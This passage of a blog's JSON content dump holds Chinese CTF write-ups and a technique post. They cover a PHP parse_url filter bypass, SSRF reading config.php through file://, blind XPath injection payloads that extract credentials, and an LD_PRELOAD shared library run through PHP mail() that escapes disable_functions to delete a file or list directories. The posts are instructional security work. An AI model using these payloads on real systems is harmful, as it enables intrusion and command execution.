Box\"></a>Access  Box</h3><p>要点：xpath注入。</p>\n<p>参考文章：<a href=\"https://www.cnblogs.com/bmjoker/p/8861927.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/bmjoker/p/8861927.html</a></p>\n<ol>\n<li><p>提取父节点名字</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;or substring(name(parent::*[position()=1]),1,1)=&apos;a</span><br></pre></td></tr></table></figure>\n<p> 结果如下：</p>\n<p><img src=\"/assets/isictf/TIM截图20180804151333.png\" alt=\"\"></p>\n<p>可以发现第一个字母为<code>u</code>。最终，可以得到父节点名字为<code>user</code>。</p>\n</li>\n<li><p>探测子节点</p>\n<p>探测第一个user节点下第二个字段的名字。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;or substring(name(//user[1]/*[2]),1,1)=&apos;u&apos; or &apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/isictf/TIM截图20180804153803.png\" alt=\"\"></p>\n</li>\n<li><p>探测子节点的值</p>\n<p>探测第一个user节点下第1个字段的值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;or substring(//user[1]/*[2],1,1)=&apos;u&apos; or &apos;a&apos;=&apos;a</span><br><span class=\"line\">或者:</span><br><span class=\"line\">&apos;or substring(//user[1]/*[1]/text(),1,1)=&apos;F&amp;password=1</span><br></pre></td></tr></table></figure>\n<p>结果:</p>\n<p><img src=\"/assets/isictf/TIM截图20180804153002.png\" alt=\"\"></p>\n<p>最终得到账号：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Adm1n</span><br><span class=\"line\">Ez_t0_gu3ss_PaSSw0rd</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h2><p><a href=\"https://github.com/chung96vn/challenges\" target=\"_blank\" rel=\"noopener\">https://github.com/chung96vn/challenges</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"lz\"><a href=\"#lz\" class=\"headerlink\" title=\"lz\"></a>lz</h3><p>代码审计</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"config.php\"</span>; </span><br><span class=\"line\">$number1 = rand(<span class=\"number\">1</span>,<span class=\"number\">100000000000000</span>); </span><br><span class=\"line\">$number2 = rand(<span class=\"number\">1</span>,<span class=\"number\">100000000000</span>); </span><br><span class=\"line\">$number3 = rand(<span class=\"number\">1</span>,<span class=\"number\">100000000</span>); </span><br><span class=\"line\">$url = urldecode($_SERVER[<span class=\"string\">'REQUEST_URI'</span>]); </span><br><span class=\"line\">$url = parse_url($url, PHP_URL_QUERY); </span><br><span class=\"line\"><span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/_/i\"</span>, $url))  </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"...\"</span>); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/0/i\"</span>, $url))  </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"...\"</span>); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/\\w+/i\"</span>, $url))  </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"...\"</span>); </span><br><span class=\"line\">&#125;     </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'_'</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>($_GET[<span class=\"string\">'_'</span>])) </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    $control = $_GET[<span class=\"string\">'_'</span>];         </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!in_array($control, <span class=\"keyword\">array</span>(<span class=\"number\">0</span>,$number1))) </span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"fail1\"</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!in_array($control, <span class=\"keyword\">array</span>(<span class=\"number\">0</span>,$number2))) </span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"fail2\"</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!in_array($control, <span class=\"keyword\">array</span>(<span class=\"number\">0</span>,$number3))) </span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"fail3\"</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $flag; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">show_source(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$url = urldecode($_SERVER[&apos;REQUEST_URI&apos;]); </span><br><span class=\"line\">$url = parse_url($url, PHP_URL_QUERY);</span><br></pre></td></tr></table></figure>\n<p>由于这里在进行parse_url操作之前，先进行了一次<code>urldecode</code>操作，所以可以编码<em>#</em> 从而绕过parse_url检测。</p>\n<p>payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://35.185.178.212/?%23&amp;_=a</span><br><span class=\"line\"></span><br><span class=\"line\">php &gt; var_dump(parse_url(urldecode(&quot;%23&amp;_=a&quot;)),PHP_URL_QUERY);</span><br><span class=\"line\">array(1) &#123;                                                    </span><br><span class=\"line\">  [&quot;fragment&quot;]=&gt;                                              </span><br><span class=\"line\">  string(4) &quot;&amp;_=a&quot;                                            </span><br><span class=\"line\">&#125;                                                             </span><br><span class=\"line\">int(6)</span><br></pre></td></tr></table></figure>\n<p>在特定情况下也可以使用如下payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://35.185.178.212///?_=a</span><br></pre></td></tr></table></figure>\n<p>测试如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php &gt; var_dump(parse_url(urldecode(&quot;//?_=a&quot;)),PHP_URL_QUERY);</span><br><span class=\"line\">bool(false)</span><br><span class=\"line\">int(6)</span><br><span class=\"line\">php &gt; var_dump(parse_url(urldecode(&quot;//a?_=a&quot;)),PHP_URL_QUERY);</span><br><span class=\"line\">array(2) &#123;</span><br><span class=\"line\">  [&quot;host&quot;]=&gt;</span><br><span class=\"line\">  string(1) &quot;a&quot;</span><br><span class=\"line\">  [&quot;query&quot;]=&gt;</span><br><span class=\"line\">  string(3) &quot;_=a&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int(6)</span><br><span class=\"line\">php &gt; var_dump(parse_url(urldecode(&quot;//a/?_=a&quot;)),PHP_URL_QUERY);</span><br><span class=\"line\">array(3) &#123;</span><br><span class=\"line\">  [&quot;host&quot;]=&gt;</span><br><span class=\"line\">  string(1) &quot;a&quot;</span><br><span class=\"line\">  [&quot;path&quot;]=&gt;</span><br><span class=\"line\">  string(1) &quot;/&quot;</span><br><span class=\"line\">  [&quot;query&quot;]=&gt;</span><br><span class=\"line\">  string(3) &quot;_=a&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int(6)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Friss\"><a href=\"#Friss\" class=\"headerlink\" title=\"Friss\"></a>Friss</h3><p>获取index.php</p>\n<blockquote>\n<p>curl <a href=\"http://35.190.142.60/index.php?debug=1\" target=\"_blank\" rel=\"noopener\">http://35.190.142.60/index.php?debug=1</a></p>\n</blockquote>\n<p>index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"keyword\">include_once</span> <span class=\"string\">\"config.php\"</span>; </span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'url'</span>])&amp;&amp;!<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'url'</span>])) </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    $url = $_POST[<span class=\"string\">'url'</span>]; </span><br><span class=\"line\">    $content_url = getUrlContent($url); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    $content_url = <span class=\"string\">\"\"</span>; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'debug'</span>])) </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;form action=<span class=\"string\">\"index.php\"</span> method=<span class=\"string\">\"POST\"</span>&gt; </span><br><span class=\"line\">&lt;input name=<span class=\"string\">\"url\"</span> type=<span class=\"string\">\"text\"</span>&gt; </span><br><span class=\"line\">&lt;input type=<span class=\"string\">\"submit\"</span> value=<span class=\"string\">\"CURL\"</span>&gt; </span><br><span class=\"line\">&lt;/form&gt; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $content_url; </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>获取config.php</p>\n<blockquote>\n<p>curl –data “url=file://localhost/var/www/html/config.php” <a href=\"http://35.190.142.60/index.php\" target=\"_blank\" rel=\"noopener\">http://35.190.142.60/index.php</a></p>\n</blockquote>\n<p>config.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$hosts = <span class=\"string\">\"localhost\"</span>;</span><br><span class=\"line\">$dbusername = <span class=\"string\">\"ssrf_user\"</span>;</span><br><span class=\"line\">$dbpasswd = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">$dbname = <span class=\"string\">\"ssrf\"</span>;</span><br><span class=\"line\">$dbport = <span class=\"number\">3306</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">initdb</span><span class=\"params\">($conn)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        $dbinit = <span class=\"string\">\"create table if not exists flag(secret varchar(100));\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(mysqli_query($conn,$dbinit)) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        $tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($tmpurl != <span class=\"string\">\"localhost\"</span> <span class=\"keyword\">and</span> $tmpurl != <span class=\"string\">\"127.0.0.1\"</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                var_dump($tmpurl);</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">\"&lt;h1&gt;Only access to localhost&lt;/h1&gt;\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $url;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getUrlContent</span><span class=\"params\">($url)</span></span>&#123;</span><br><span class=\"line\">        $url = safe($url);</span><br><span class=\"line\">        $url = escapeshellarg($url);</span><br><span class=\"line\">        $pl = <span class=\"string\">\"curl \"</span>.$url;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $pl;</span><br><span class=\"line\">        $content = shell_exec($pl);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $content;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">initdb($conn);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>登录数据库</p>\n<blockquote>\n<p>mysql -h 127.0.0.1 -u ssrf_user </p>\n</blockquote>\n<p>ssrf操作: 利用gopher协议查询数据库。</p>\n<h3 id=\"Access-Box\"><a href=\"#Access-Box\" class=\"headerlink\" title=\"Access  Box\"></a>Access  Box</h3><p>要点：xpath注入。</p>\n<p>参考文章：<a href=\"https://www.cnblogs.com/bmjoker/p/8861927.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/bmjoker/p/8861927.html</a></p>\n<ol>\n<li><p>提取父节点名字</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;or substring(name(parent::*[position()=1]),1,1)=&apos;a</span><br></pre></td></tr></table></figure>\n<p> 结果如下：</p>\n<p><img src=\"/assets/isictf/TIM截图20180804151333.png\" alt=\"\"></p>\n<p>可以发现第一个字母为<code>u</code>。最终，可以得到父节点名字为<code>user</code>。</p>\n</li>\n<li><p>探测子节点</p>\n<p>探测第一个user节点下第二个字段的名字。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;or substring(name(//user[1]/*[2]),1,1)=&apos;u&apos; or &apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/isictf/TIM截图20180804153803.png\" alt=\"\"></p>\n</li>\n<li><p>探测子节点的值</p>\n<p>探测第一个user节点下第1个字段的值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;or substring(//user[1]/*[2],1,1)=&apos;u&apos; or &apos;a&apos;=&apos;a</span><br><span class=\"line\">或者:</span><br><span class=\"line\">&apos;or substring(//user[1]/*[1]/text(),1,1)=&apos;F&amp;password=1</span><br></pre></td></tr></table></figure>\n<p>结果:</p>\n<p><img src=\"/assets/isictf/TIM截图20180804153002.png\" alt=\"\"></p>\n<p>最终得到账号：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Adm1n</span><br><span class=\"line\">Ez_t0_gu3ss_PaSSw0rd</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h2><p><a href=\"https://github.com/chung96vn/challenges\" target=\"_blank\" rel=\"noopener\">https://github.com/chung96vn/challenges</a></p>\n"},{"title":"LD_PRELOAD","date":"2018-06-04T02:10:00.000Z","_content":"\n# LRE_PAYLOAD绕过open_basedir\n\n参考链接:\n\n[利用环境变量LD_PRELOAD绕过disable_function执行系统命令](http://wooyun.jozxing.cc/static/drops/tips-16054.html)\n\n[PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)\n\n源码:\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid payload() {\n\tsystem(\"rm /tmp/check.txt\");\n}\nint  geteuid() {\n\tif (getenv(\"LD_PRELOAD\") == NULL) { return 0; }\n\tunsetenv(\"LD_PRELOAD\");\n\tpayload();\n}\n\n```\n\n编译:\n\n```\ngcc -c -fPIC shell.c -o teset\ngcc -shared teset -o test.so\n```\n\nevil.php\n\n```\n<?php\nputenv(\"LD_PRELOAD=/var/www/html/preload/test.so\");\n\tmail(\"a@localhost\",\"\",\"\",\"\",\"\");\n?>\n```\n\n执行evil.php ，可以发现check.txt被删除。\n\n列目录的payload:\n\n```\n#include <dirent.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid payload()\n{\n    DIR* dir;\n    struct dirent* ptr;\n    dir = opendir(\"/\");\n    FILE  *fp;\n    fp=fopen(\"/tmp/venenoveneno\",\"w\");\n    while ((ptr = readdir(dir)) != NULL) {\n        fprintf(fp,\"%s\\n\",ptr->d_name);\n    }\n    closedir(dir);\n    fflush(fp);\n}\nint geteuid()\n{\n    if (getenv(\"LD_PRELOAD\") == NULL) {\n        return 0;\n    }\n    unsetenv(\"LD_PRELOAD\");\n    payload();\n}\n```\n\n\n\n","source":"_posts/LD-PRELOAD.md","raw":"---\ntitle: LD_PRELOAD\ndate: 2018-06-04 10:10:00\ntags: pwn\n---\n\n# LRE_PAYLOAD绕过open_basedir\n\n参考链接:\n\n[利用环境变量LD_PRELOAD绕过disable_function执行系统命令](http://wooyun.jozxing.cc/static/drops/tips-16054.html)\n\n[PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)\n\n源码:\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid payload() {\n\tsystem(\"rm /tmp/check.txt\");\n}\nint  geteuid() {\n\tif (getenv(\"LD_PRELOAD\") == NULL) { return 0; }\n\tunsetenv(\"LD_PRELOAD\");\n\tpayload();\n}\n\n```\n\n编译:\n\n```\ngcc -c -fPIC shell.c -o teset\ngcc -shared teset -o test.so\n```\n\nevil.php\n\n```\n<?php\nputenv(\"LD_PRELOAD=/var/www/html/preload/test.so\");\n\tmail(\"a@localhost\",\"\",\"\",\"\",\"\");\n?>\n```\n\n执行evil.php ，可以发现check.txt被删除。\n\n列目录的payload:\n\n```\n#include <dirent.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid payload()\n{\n    DIR* dir;\n    struct dirent* ptr;\n    dir = opendir(\"/\");\n    FILE  *fp;\n    fp=fopen(\"/tmp/venenoveneno\",\"w\");\n    while ((ptr = readdir(dir)) != NULL) {\n        fprintf(fp,\"%s\\n\",ptr->d_name);\n    }\n    closedir(dir);\n    fflush(fp);\n}\nint geteuid()\n{\n    if (getenv(\"LD_PRELOAD\") == NULL) {\n        return 0;\n    }\n    unsetenv(\"LD_PRELOAD\");\n    payload();\n}\n```\n\n\n\n","slug":"LD-PRELOAD","published":1,"updated":"2018-06-25T12:00:14.705Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12gl0004qkdl032rmg7v","content":"<h1 id=\"LRE-PAYLOAD绕过open-basedir\"><a href=\"#LRE-PAYLOAD绕过open-basedir\" class=\"headerlink\" title=\"LRE_PAYLOAD绕过open_basedir\"></a>LRE_PAYLOAD绕过open_basedir</h1><p>参考链接:</p>\n<p><a href=\"http://wooyun.jozxing.cc/static/drops/tips-16054.html\" target=\"_blank\" rel=\"noopener\">利用环境变量LD_PRELOAD绕过disable_function执行系统命令</a></p>\n<p><a href=\"https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html\" target=\"_blank\" rel=\"noopener\">PHP绕过open_basedir列目录的研究</a></p>\n<p>源码:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">void payload() &#123;</span><br><span class=\"line\">\tsystem(&quot;rm /tmp/check.txt&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int  geteuid() &#123;</span><br><span class=\"line\">\tif (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;</span><br><span class=\"line\">\tunsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class=\"line\">\tpayload();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c -fPIC shell.c -o teset</span><br><span class=\"line\">gcc -shared teset -o test.so</span><br></pre></td></tr></table></figure>\n<p>evil.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">putenv(&quot;LD_PRELOAD=/var/www/html/preload/test.so&quot;);</span><br><span class=\"line\">\tmail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>执行evil.php ，可以发现check.txt被删除。</p>\n<p>列目录的payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;dirent.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">void payload()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DIR* dir;</span><br><span class=\"line\">    struct dirent* ptr;</span><br><span class=\"line\">    dir = opendir(&quot;/&quot;);</span><br><span class=\"line\">    FILE  *fp;</span><br><span class=\"line\">    fp=fopen(&quot;/tmp/venenoveneno&quot;,&quot;w&quot;);</span><br><span class=\"line\">    while ((ptr = readdir(dir)) != NULL) &#123;</span><br><span class=\"line\">        fprintf(fp,&quot;%s\\n&quot;,ptr-&gt;d_name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    closedir(dir);</span><br><span class=\"line\">    fflush(fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int geteuid()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123;</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class=\"line\">    payload();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"LRE-PAYLOAD绕过open-basedir\"><a href=\"#LRE-PAYLOAD绕过open-basedir\" class=\"headerlink\" title=\"LRE_PAYLOAD绕过open_basedir\"></a>LRE_PAYLOAD绕过open_basedir</h1><p>参考链接:</p>\n<p><a href=\"http://wooyun.jozxing.cc/static/drops/tips-16054.html\" target=\"_blank\" rel=\"noopener\">利用环境变量LD_PRELOAD绕过disable_function执行系统命令</a></p>\n<p><a href=\"https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html\" target=\"_blank\" rel=\"noopener\">PHP绕过open_basedir列目录的研究</a></p>\n<p>源码:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 